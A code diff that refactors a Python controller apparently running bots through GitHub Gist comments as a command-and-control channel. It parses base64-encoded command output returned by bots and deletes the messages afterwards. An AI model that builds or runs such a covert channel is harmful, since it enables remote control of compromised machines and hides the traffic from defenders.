@@ -55,7 +55,7 @@ class Controller:
         """
         with self.bots_lock:
             if Channel.PING_RESPONSE in response.body:
-                bot_id, command_id = self.parse_response(response)
+                bot_id, command_id = self.parse_response_metadata(response)
 
                 if not self.bots.get(bot_id):
                     self.bots[bot_id] = {}
@@ -65,23 +65,28 @@ class Controller:
                 self.channel.delete_message(response.id)
 
             elif Channel.BINARY_RESPONSE in response.body:
-                bot_id, command_id = self.parse_response(response)
+                bot_id, command_id = self.parse_response_metadata(response)
 
                 bot = self.bots.get(bot_id)
 
                 if bot and bot["commands"] and bot["commands"][command_id]:
-                    stdout = base64.b64decode(
+
+                    output_begin = response.body.find("(") + 1
+                    output_end = response.body.find(")", output_begin)
+
+                    output = base64.b64decode(
                         response.body[
-                            response.body.find("(") + 1 : response.body.find(")")
+                            output_begin : output_end
                         ].encode("utf-8")
                     ).decode("utf-8")
-                    print(f"\n{stdout}")
+
+                    print(f"\n{output}")
                     self.channel.delete_message(command_id)
                     bot["commands"].pop(command_id)
 
                 self.channel.delete_message(response.id)
 
-    def parse_response(self, response: GistComment) -> (str, str):
+    def parse_response_metadata(self, response: GistComment) -> (str, str):
         """
         Parses needed response metadata from a response
         :param response: GistComment containing the response
